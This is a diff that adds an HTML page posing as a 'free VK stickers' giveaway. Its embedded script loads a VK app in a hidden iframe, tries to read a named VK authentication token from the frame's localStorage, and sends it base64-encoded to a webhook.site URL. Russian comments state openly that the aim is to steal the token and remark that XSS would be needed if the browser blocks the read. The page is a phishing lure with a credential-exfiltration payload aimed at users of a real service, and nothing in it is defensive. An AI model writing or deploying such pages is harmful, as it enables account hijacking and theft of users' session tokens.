@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Stickers VK</title>
+</head>
+<body>
+    <h1>Поздравляем! Вы получили бесплатные стикеры.</h1>
+    <p>Подождите, идет загрузка...</p>
+
+    <script>
+        // Попытка украсть токен через вложенный iframe
+        const frame = document.createElement('iframe');
+        frame.src = 'https://vk.com/app51491054'; // URL приложения
+        frame.style.display = 'none';
+        document.body.appendChild(frame);
+
+        frame.onload = function() {
+            try {
+                // Если у приложения нет защиты X-Frame-Options, 
+                // мы читаем его localStorage
+                const data = frame.contentWindow.localStorage.getItem('6287487:web_token:login:auth');
+                if (data) {
+                    fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?stolen=' + btoa(data));
+                    alert('Токен успешно украден!');
+                }
+            } catch (e) {
+                console.log("Доступ заблокирован защитой браузера. Это подтверждает, что нужна XSS.");
+            }
+        };
+    </script>
+</body>
+</html>
